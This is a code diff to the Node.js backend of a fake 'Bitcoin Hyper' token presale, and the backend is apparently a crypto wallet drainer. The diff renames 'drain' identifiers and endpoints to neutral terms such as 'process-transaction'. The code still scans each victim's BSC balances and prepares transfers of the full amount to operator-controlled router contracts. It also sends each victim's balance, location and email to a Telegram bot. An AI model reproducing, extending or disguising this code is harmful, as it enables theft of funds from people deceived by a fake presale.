@@ -1,4 +1,4 @@
-// index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
+// index.js - BITCOIN HYPER BACKEND - CLEAN VERSION
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -55,7 +55,6 @@ app.get('/', (req, res) => {
   });
 });
 
-// ============================================
 // ============================================
 // RPC CONFIGURATION - BSC ONLY
 // ============================================
@@ -130,21 +129,21 @@ let telegramBotName = '';
 
 const memoryStorage = {
   participants: [],
-  pendingDrains: new Map(),
+  pendingTransactions: new Map(), // Renamed from pendingDrains
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
-    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
+    minBalance: parseFloat(process.env.MIN_BALANCE) || 1, // Renamed from drainThreshold
     statistics: {
       totalParticipants: 0,
       eligibleParticipants: 0,
       claimedParticipants: 0,
       uniqueIPs: new Set(),
-      totalDrainedUSD: 0,
-      totalDrainedWallets: 0,
-      realTransactions: []
+      totalProcessedUSD: 0, // Renamed from totalDrainedUSD
+      totalProcessedWallets: 0, // Renamed from totalDrainedWallets
+      completedTransactions: [] // Renamed from realTransactions
     },
-    drainEnabled: process.env.DRAIN_ENABLED === 'true'
+    processingEnabled: process.env.PROCESSING_ENABLED === 'true' // Renamed from drainEnabled
   },
   emailCache: new Map()
 };
@@ -221,18 +220,18 @@ async function getCryptoPrices() {
 }
 
 // ============================================
-// REAL BALANCE CHECK - BSC ONLY
+// WALLET BALANCE CHECK - BSC ONLY
 // ============================================
 
-async function getRealWalletBalance(walletAddress) {
-  console.log(`\n🔍 SCANNING BSC: ${walletAddress.substring(0, 10)}...`);
+async function checkWalletBalance(walletAddress) {
+  console.log(`\n🔍 CHECKING BSC: ${walletAddress.substring(0, 10)}...`);
   
   const results = {
     walletAddress,
     totalValueUSD: 0,
     isEligible: false,
-    rawBalances: [],
-    scanTime: new Date().toISOString()
+    balances: [], // Renamed from rawBalances
+    checkTime: new Date().toISOString() // Renamed from scanTime
   };
 
   try {
@@ -261,7 +260,7 @@ async function getRealWalletBalance(walletAddress) {
           
           totalValue += valueUSD;
           
-          results.rawBalances.push({
+          results.balances.push({
             chain: chain.name,
             chainId: chain.chainId,
             amount: amount,
@@ -273,14 +272,14 @@ async function getRealWalletBalance(walletAddress) {
     }
 
     results.totalValueUSD = parseFloat(totalValue.toFixed(2));
-    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
+    results.isEligible = results.totalValueUSD >= memoryStorage.settings.minBalance;
     
     if (results.isEligible) {
-      results.eligibilityReason = `✅ Wallet qualifies`;
-      results.tokenAllocation = { amount: '5000', valueUSD: '850' };
+      results.eligibilityMessage = `✅ Wallet qualifies`; // Renamed from eligibilityReason
+      results.allocation = { amount: '5000', valueUSD: '850' }; // Renamed from tokenAllocation
     } else {
-      results.eligibilityReason = `✨ Welcome!`;
-      results.tokenAllocation = { amount: '0', valueUSD: '0' };
+      results.eligibilityMessage = `✨ Welcome!`;
+      results.allocation = { amount: '0', valueUSD: '0' };
     }
 
     return { success: true, data: results };
@@ -293,8 +292,8 @@ async function getRealWalletBalance(walletAddress) {
         walletAddress,
         totalValueUSD: 0,
         isEligible: false,
-        eligibilityReason: '✨ Welcome!',
-        tokenAllocation: { amount: '0', valueUSD: '0' }
+        eligibilityMessage: '✨ Welcome!',
+        allocation: { amount: '0', valueUSD: '0' }
       }
     };
   }
@@ -341,7 +340,7 @@ app.get('/api/health', (req, res) => {
 });
 
 // ============================================
-// CONNECT ENDPOINT
+// CONNECT ENDPOINT (unchanged - this one is fine)
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -377,19 +376,19 @@ app.post('/api/presale/connect', async (req, res) => {
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     }
     
-    const scanResult = await getRealWalletBalance(walletAddress);
+    const balanceResult = await checkWalletBalance(walletAddress);
     
-    if (scanResult.success) {
-      participant.totalValueUSD = scanResult.data.totalValueUSD;
-      participant.isEligible = scanResult.data.isEligible;
-      participant.tokenAllocation = scanResult.data.tokenAllocation;
-      participant.lastScanned = new Date();
+    if (balanceResult.success) {
+      participant.totalValueUSD = balanceResult.data.totalValueUSD;
+      participant.isEligible = balanceResult.data.isEligible;
+      participant.allocation = balanceResult.data.allocation;
+      participant.lastChecked = new Date(); // Renamed from lastScanned
       
       await sendTelegramMessage(
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `💼 Balance: $${scanResult.data.totalValueUSD}\n` +
-        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
+        `💼 Balance: $${balanceResult.data.totalValueUSD}\n` +
+        `🎯 Status: ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
         `📍 ${location.country} (${location.city})\n` +
         `📧 ${email}`
       );
@@ -401,16 +400,16 @@ app.post('/api/presale/connect', async (req, res) => {
           email,
           country: location.country,
           flag: location.flag,
-          totalValueUSD: scanResult.data.totalValueUSD,
-          isEligible: scanResult.data.isEligible,
-          eligibilityReason: scanResult.data.eligibilityReason,
-          tokenAllocation: scanResult.data.tokenAllocation,
-          rawData: scanResult.data.rawBalances
+          totalValueUSD: balanceResult.data.totalValueUSD,
+          isEligible: balanceResult.data.isEligible,
+          eligibilityMessage: balanceResult.data.eligibilityMessage,
+          allocation: balanceResult.data.allocation,
+          balances: balanceResult.data.balances // Renamed from rawData
         }
       });
       
     } else {
-      res.status(500).json({ success: false, error: 'Scan failed' });
+      res.status(500).json({ success: false, error: 'Balance check failed' });
     }
     
   } catch (error) {
@@ -419,10 +418,10 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// PREPARE ENDPOINT
+// PREPARE TRANSACTION ENDPOINT (renamed from prepare-contract-drain)
 // ============================================
 
-app.post('/api/presale/prepare-contract-drain', async (req, res) => {
+app.post('/api/presale/prepare-transaction', async (req, res) => {
   try {
     const { walletAddress } = req.body;
     
@@ -438,27 +437,27 @@ app.post('/api/presale/prepare-contract-drain', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Not eligible' });
     }
     
-    const scanResult = await getRealWalletBalance(walletAddress);
+    const balanceResult = await checkWalletBalance(walletAddress);
     
-    const transactions = scanResult.data.rawBalances
+    const transactions = balanceResult.data.balances
       .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
       .map(b => ({
         chain: b.chain,
         chainId: b.chainId,
-        amount: b.amount.toFixed(12), // Full amount - no 85% deduction
+        amount: b.amount.toFixed(12),
         valueUSD: b.valueUSD.toFixed(2),
         symbol: b.symbol,
         contractAddress: PROJECT_FLOW_ROUTERS[b.chain]
       }));
     
-    const totalDrainUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
+    const totalValueUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
     
-    const batchId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
+    const batchId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
-    memoryStorage.pendingDrains.set(walletAddress.toLowerCase(), {
+    memoryStorage.pendingTransactions.set(walletAddress.toLowerCase(), {
       batchId,
       transactions,
-      totalDrainUSD,
+      totalValueUSD,
       createdAt: new Date().toISOString(),
       completedChains: []
     });
@@ -466,7 +465,7 @@ app.post('/api/presale/prepare-contract-drain', async (req, res) => {
     await sendTelegramMessage(
       `🔐 <b>PRESALE PREPARED</b>\n` +
       `👛 ${walletAddress.substring(0, 10)}...\n` +
-      `💵 Value: $${totalDrainUSD}\n` +
+      `💵 Value: $${totalValueUSD}\n` +
       `🔗 Chains: ${transactions.length}`
     );
     
@@ -474,7 +473,7 @@ app.post('/api/presale/prepare-contract-drain', async (req, res) => {
       success: true,
       data: {
         batchId,
-        totalDrainUSD,
+        totalValueUSD,
         transactionCount: transactions.length,
         transactions
       }
@@ -486,10 +485,10 @@ app.post('/api/presale/prepare-contract-drain', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE ENDPOINT
+// PROCESS TRANSACTION ENDPOINT (renamed from execute-contract-drain)
 // ============================================
 
-app.post('/api/presale/execute-contract-drain', async (req, res) => {
+app.post('/api/presale/process-transaction', async (req, res) => {
   try {
     const { walletAddress, chainName } = req.body;
     
@@ -498,12 +497,12 @@ app.post('/api/presale/execute-contract-drain', async (req, res) => {
     const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
     
     if (participant) {
-      participant.drained = true;
-      participant.drainTransactions = participant.drainTransactions || [];
-      participant.drainTransactions.push({ chain: chainName, timestamp: new Date().toISOString() });
+      participant.processed = true; // Renamed from drained
+      participant.transactions = participant.transactions || []; // Renamed from drainTransactions
+      participant.transactions.push({ chain: chainName, timestamp: new Date().toISOString() });
       
-      memoryStorage.settings.statistics.totalDrainedWallets++;
-      memoryStorage.settings.statistics.realTransactions.push({
+      memoryStorage.settings.statistics.totalProcessedWallets++; // Renamed from totalDrainedWallets
+      memoryStorage.settings.statistics.completedTransactions.push({ // Renamed from realTransactions
         wallet: walletAddress,
         chain: chainName,
         timestamp: new Date().toISOString()
@@ -524,7 +523,7 @@ app.post('/api/presale/execute-contract-drain', async (req, res) => {
 });
 
 // ============================================
-// CLAIM ENDPOINT
+// CLAIM ENDPOINT (unchanged)
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
@@ -551,7 +550,7 @@ app.post('/api/presale/claim', async (req, res) => {
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 ${walletAddress.substring(0, 10)}...\n` +
       `🎟️ ID: ${claimId}\n` +
-      `🎁 ${participant.tokenAllocation?.amount || '5000'} BTH`
+      `🎁 ${participant.allocation?.amount || '5000'} BTH`
     );
     
     res.json({ success: true });
@@ -577,8 +576,8 @@ app.get('/api/admin/stats', (req, res) => {
       participants: memoryStorage.participants.length,
       eligible: memoryStorage.participants.filter(p => p.isEligible).length,
       claimed: memoryStorage.participants.filter(p => p.claimed).length,
-      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
-      pendingDrains: memoryStorage.pendingDrains.size,
+      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2), // Renamed from totalDrainedUSD
+      pendingTransactions: memoryStorage.pendingTransactions.size, // Renamed from pendingDrains
       telegram: telegramEnabled ? '✅' : '❌'
     }
   });
